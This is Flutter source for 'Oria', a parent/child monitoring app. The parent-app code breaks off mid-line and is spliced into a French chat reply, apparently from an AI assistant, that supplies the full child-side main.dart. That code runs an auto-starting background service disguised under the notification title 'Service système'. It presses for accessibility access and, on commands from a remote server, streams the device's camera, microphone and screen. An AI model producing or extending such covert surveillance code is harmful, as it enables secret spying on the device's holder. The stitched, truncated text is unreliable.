import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:flutter_webrtc/flutter_webrtc.dart';
import 'package:google_fonts/google_fonts.dart';

const String SERVER_URL = 'https://oria-server-tzc1.onrender.com';
const String PARENT_ID = 'parent-main';

void main() => runApp(const OriaParentApp());

class OriaParentApp extends StatelessWidget {
  const OriaParentApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      theme: ThemeData(useMaterial3: true, colorSchemeSeed: Colors.indigo, textTheme: GoogleFonts.poppinsTextTheme(), brightness: Brightness.dark),
      home: const DeviceListScreen(),
    );
  }
}

class DeviceListScreen extends StatefulWidget {
  const DeviceListScreen({super.key});
  @override State<DeviceListScreen> createState() => _DeviceListScreenState();
}

class _DeviceListScreenState extends State<DeviceListScreen> {
  late IO.Socket socket;
  List<Map<String, dynamic>> devices = [];
  bool connected = false;

  @override
  void initState() {
    super.initState();
    socket = IO.io(SERVER_URL, <String, dynamic>{'transports': ['websocket'], 'autoConnect': true, 'reconnection': true, 'reconnectionDelay': 5000});
    socket.on('connect', (_) {
      setState(() => connected = true);
      socket.emit('register_parent', PARENT_ID);
      socket.emit('get_devices');
    });
    socket.on('disconnect', (_) => setState(() => connected = false));
    socket.on('device_list', (data) => setState(() => devices = List<Map<String, dynamic>>.from(data)));
    socket.on('device_list_updated', (_) => socket.emit('get_devices'));
  }

  Future<void> _rename(String id, String name) async {
    final c = TextEditingController(text: name);
    await showDialog(context: context, builder: (ctx) => AlertDialog(
      title: const Text('Renommer'), content: TextField(controller: c, decoration: const InputDecoration(labelText: 'Nom personnalisé')),
      actions: [TextButton(onPressed: () => Navigator.pop(ctx), child: const Text('Annuler')), FilledButton(onPressed: () { if (c.text.isNotEmpty) { socket.emit('rename_device', {'deviceId': id, 'newName': c.text}); Navigator.pop(ctx); } }, child: const Text('OK'))],
    ));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(title: Row(children: [const Text('Appareils'), const Spacer(), Icon(connected ? Icons.cloud_done : Icons.cloud_off, size: 20)])),
      body: !connected
          ? const Center(child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [CircularProgressIndicator(), SizedBox(height: 16), Text('Connexion au serveur...\n(Réveil ~30s)', textAlign: TextAlign.center)]))
          : devices.isEmpty
              ? const Center(child: Text('Aucun appareil.\nInstallez "oria".'))
              : RefreshIndicator(onRefresh: () async => socket.emit('get_devices'), child: ListView.builderVoici les **2 fichiers complets** corrigés. J'ai ajouté un **panneau de logs visible directement sur l'écran de l'enfant** pour que tu puisses voir ce qui se passe sans aucun outil technique.

---

### 1. `oria_child/lib/main.dart`
**Action :** REMPLACER ENTIÈREMENT
**Nouveautés :** Logs visibles à l'écran + diagnostic en temps réel

```dart
import 'package:flutter/material.dart';
import 'package:flutter_background_service/flutter_background_service.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as IO;
import 'package:device_info_plus/device_info_plus.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'stream_service.dart';
import 'dart:ui';

const String SERVER_URL = 'https://oria-server-tzc1.onrender.com';

// ✅ Logs visibles à l'écran
final List<String> _visibleLogs = [];
void addLog(String msg) {
  final line = '${DateTime.now().toString().substring(11, 19)} $msg';
  _visibleLogs.insert(0, line);
  if (_visibleLogs.length > 20) _visibleLogs.removeLast();
  print('[ORIA] $line');
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  addLog('App démarrée');

  await [
    Permission.camera,
    Permission.microphone,
    Permission.location,
    Permission.notification,
    Permission.storage,
  ].request();
  addLog('Permissions demandées');

  final prefs = await SharedPreferences.getInstance();
  final accessibilityEnabled = prefs.getBool('accessibility_enabled') ?? false;

  if (!accessibilityEnabled) {
    runApp(const EnableAccessibilityScreen());
    return;
  }
  addLog('Accessibilité: ACTIVÉE');

  await initializeService();
  runApp(const OriaChildApp());
}

Future<void> initializeService() async {
  final service = FlutterBackgroundService();
  await service.configure(
    androidConfiguration: AndroidConfiguration(
      onStart: onStart,
      autoStart: true,
      isForegroundMode: true,
      foregroundServiceNotificationId: 888,
      initialNotificationTitle: 'Service système',
      initialNotificationContent: 'Actif',
    ),
    iosConfiguration: IosConfiguration(autoStart: true, onForeground: onStart),
  );
  await service.startService();
  addLog('Service arrière-plan démarré');
}

@pragma('vm:entry-point')
void onStart(ServiceInstance instance) async {
  DartPluginRegistrant.ensureInitialized();
  final deviceInfo = DeviceInfoPlugin();
  final androidInfo = await deviceInfo.androidInfo;
  final deviceId = androidInfo.id;
  final deviceName = '${androidInfo.manufacturer} ${androidInfo.model}';

  IO.Socket? socket;
  StreamService? streamService;

  void connect() {
    socket?.dispose();
    socket = IO.io(SERVER_URL, <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
      'reconnection': true,
      'reconnectionDelay': 5000,
      'reconnectionAttempts': 999,
    });

    socket!.on('connect', (_) {
      addLog('✅ Connecté au serveur');
      socket!.emit('register_child', {'deviceId': deviceId, 'deviceName': deviceName});
      addLog('📤 Enregistré: $deviceName');
    });

    socket!.on('execute_command', (data) async {
      final action = data['action'];
      addLog('📡 COMMANDE REÇUE: $action');

      try {
        if (action == 'start_camera') {
          await streamService?.stop();
          streamService = StreamService(socket!, 'parent-main');
          await streamService!.startCamera();
          addLog('✅ CAMÉRA DÉMARRÉE');
        } else if (action == 'start_mic') {
          await streamService?.stop();
          streamService = StreamService(socket!, 'parent-main');
          await streamService!.startMic();
          addLog('✅ MICRO DÉMARRÉ');
        } else if (action == 'start_screen') {
          await streamService?.stop();
          streamService = StreamService(socket!, 'parent-main');
          await streamService!.startScreen();
          addLog('✅ ÉCRAN DÉMARRÉ');
        } else if (action == 'stop_stream') {
          await streamService?.stop();
          streamService = null;
          addLog('🛑 STREAM ARRÊTÉ');
        }
      } catch (e) {
        addLog('❌ ERREUR: $e');
      }
    });

    socket!.on('signal', (msg) {
      addLog('🔄 Signal reçu: ${msg['type']}');
      streamService?.handleSignal(msg);
    });

    socket!.on('connect_error', (_) => addLog('⏳ Reconnexion...'));
    socket!.on('disconnect', (_) => addLog('❌ Déconnecté'));
  }
  connect();
}

class EnableAccessibilityScreen extends StatelessWidget {
  const EnableAccessibilityScreen({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: Center(
          child: Padding(
            padding: const EdgeInsets.all(32),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                Icon(Icons.accessibility_new, color: Colors.indigo, size: 80),
                const SizedBox(height: 24),
                const Text('Activation requise', style: TextStyle(color: Colors.white, fontSize: 24, fontWeight: FontWeight.bold)),
                const SizedBox(height: 16),
                const Text('ORIA a besoin du service d\'accessibilité.\n\n1. Cliquez ci-dessous\n2. Activez "ORIA"\n3. Revenez ici', textAlign: TextAlign.center, style: TextStyle(color: Colors.grey, fontSize: 14)),
                const SizedBox(height: 32),
                FilledButton.icon(
                  onPressed: () async {
                    const intent = AndroidIntent(action: 'android.settings.ACCESSIBILITY_SETTINGS');
                    await intent.launch();
                  },
                  icon: const Icon(Icons.settings_accessibility),
                  label: const Text('OUVRIR PARAMÈTRES'),
                  style: FilledButton.styleFrom(minimumSize: const Size(double.infinity, 50)),
                ),
                const SizedBox(height: 16),
                TextButton(
                  onPressed: () async {
                    final prefs = await SharedPreferences.getInstance();
                    await prefs.setBool('accessibility_enabled', true);
                    await initializeService();
                    runApp(const OriaChildApp());
                  },
                  child: const Text('Déjà activé → Continuer', style: TextStyle(color: Colors.grey)),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}

class OriaChildApp extends StatefulWidget {
  const OriaChildApp({super.key});
  @override
  State<OriaChildApp> createState() => _OriaChildAppState();
}

class _OriaChildAppState extends State<OriaChildApp> {
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: Scaffold(
        backgroundColor: Colors.black,
        body: SafeArea(
          child: Column(
            children: [
              const Padding(
                padding: EdgeInsets.all(16),
                child: Row(
                  children: [
                    Icon(Icons.visibility_off, color: Colors.grey, size: 32),
                    SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text("ORIA Activé", style: TextStyle(color: Colors.grey, fontSize: 16)),
                          Text("Service en arrière-plan actif.", style: TextStyle(color: Colors.grey, fontSize: 11)),
                        ],
                      ),
                    ),
                  ],
                ),
              ),
              const Divider(color: Colors.grey),
              // ✅ PANNEAU DE LOGS VISIBLES
              Expanded(
                child: ListView.builder(
                  padding: const EdgeInsets.all(12),
                  itemCount: _visibleLogs.length,
                  itemBuilder: (_, i) => Padding(
                    padding: const EdgeInsets.only(bottom: 4),
                    child: Text(
                      _visibleLogs[i],
                      style: TextStyle(
                        color: _visibleLogs[i].contains('❌') ? Colors.red :
                               _visibleLogs[i].contains('✅') ? Colors.green :
                               _visibleLogs[i].contains('📡') ? Colors.yellow :
                               Colors.grey[400],
                        fontSize: 12,
                        fontFamily: 'monospace',
                      ),
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}